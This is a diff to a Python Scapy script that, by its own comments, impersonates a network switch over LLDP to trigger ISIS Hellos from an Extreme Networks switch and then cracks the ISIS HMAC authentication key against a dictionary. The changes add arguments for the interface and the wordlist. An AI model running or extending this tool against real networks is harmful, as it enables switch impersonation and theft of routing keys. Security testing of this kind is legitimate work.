@@ -12,8 +12,8 @@ from hashlib import sha256
 from hashlib import md5
 import hmac
 
-IFACE = "br-lan"
-MY_MAC = get_if_hwaddr(IFACE)
+#IFACE = "br-lan"
+#MY_MAC = get_if_hwaddr(IFACE)
 BLOCK_SIZE = 64 #B, in bytes, 64 for sha-256
 HASH_LEN = 32 #L, in bytes, 32 for sha-256. L is the length of the hash, measured in octets rather than bits.
 OPAD = b"\x5c" * BLOCK_SIZE
@@ -23,20 +23,7 @@ APAD = bytes.fromhex("878FE1F3") * (HASH_LEN // 4)  # to be repeated HASH_LEN/4 
 # If auth.length = 17 then it's md5 ()
 # If auth.length = 35 then it's sha-256 ()
 # Type is always 10 (0a), then length, then hash function (03 for sha256, 54 (36) for md5)
-# For type sha, keyid is coded on 2 bytes before the hash itself
-
-#a=rdpcap("Wireshark_captures/sha-256-one-side-from-startup.pcapng")
-#p_rcv = PacketList(a)[0]
-
-#print(p_rcv.getlayer(LLDPDUChassisID).id) # Extract the MAC address from the Chassis ID field
-
-# print("####################")
-# lldp_layer = p[0].getlayer(LLDPDUChassisID)
-# if lldp_layer:
-#     print(lldp_layer.subtype)
-#     print(lldp_layer.fields)
-#     print(lldp_layer.id)
-# print("####################")
+# For type sha256 only, keyid is coded on 2 bytes before the hash itself
 
 # Derive the 5th byte of the target MAC address. Keep the MAC vendor and the last byte to 00.
 def derive_mac(input: str) -> str:
@@ -46,8 +33,8 @@ def derive_mac(input: str) -> str:
     return new_mac
 
 # Derive the last byte of the target IP address.
-# TODO : Ensure the random value is not the input value (low chance but...)
 def derive_ip(input: bytes) -> bytes:
+    # TODO : Ensure the random value is not the input value (low chance but...)
     parts = list(input)
     parts[3] = random.randint(1, 254)
     new_ip = bytes(parts)
@@ -166,13 +153,24 @@ def find_isis_key(packet: Packet):
                 break;
     return f_key
 
-# Do you really need to describe main ?
+# Listen to network interface, capture LLDP and ISIS packets only, find the ISIS key
+# Script assume target switch is Extreme Networks running Fabric Engine with auto-sense
 def main():
-    # A single sniffer to capture both LLDP and ISIS
+    # A single sniffer to capture both LLDP and ISIS.
     # On the first LLDP from the target, impersonate a switch and send a LLDP packet to trigger the ISIS Hello;
-    # On the ISIS Hello from the target, dissect the packet and bruteforce the key.
+    # On the ISIS Hello from the target, dissect the packet and find the key.
+    # Forming ISIS adjacency from virtual VOSS switch is outside the scope of this script for now...
     start_time = time.time()
     state = {}
+
+    if len(sys.argv) != 3:
+        print("Script usage : script.py <network interface> <dictionnary>")
+        return 1
+    iface = sys.argv[1]
+    dict_param = sys.argv[2]
+    i_mac = get_if_hwaddr(iface)
+
+
 
     def handle(pkt):
         # LLDP from the target -> impersonate a switch to trigger the ISIS Hello.
@@ -187,7 +185,7 @@ def main():
     # keep only LLDP and ISIS; ignore our own frame; stop as soon as ISIS is caught.
     sniff(
         offline="Wireshark_captures/ISIS-89139121961zyf.pcapng",
-        lfilter=lambda p: p.src != MY_MAC
+        lfilter=lambda p: p.src != i_mac
             and (p.haslayer(LLDPDU) or p.haslayer(ISIS_CommonHdr)),
         prn=handle,
         stop_filter=lambda p: "isis" in state,
@@ -198,7 +196,7 @@ def main():
         print("No ISIS Hello captured within timeout.")
         return
 
-    f_key = find_isis_key(state["isis"])
+    f_key = find_isis_key(state["isis"], dict_param)
     if f_key:
         print("Key found: ", f_key.decode())
     else:
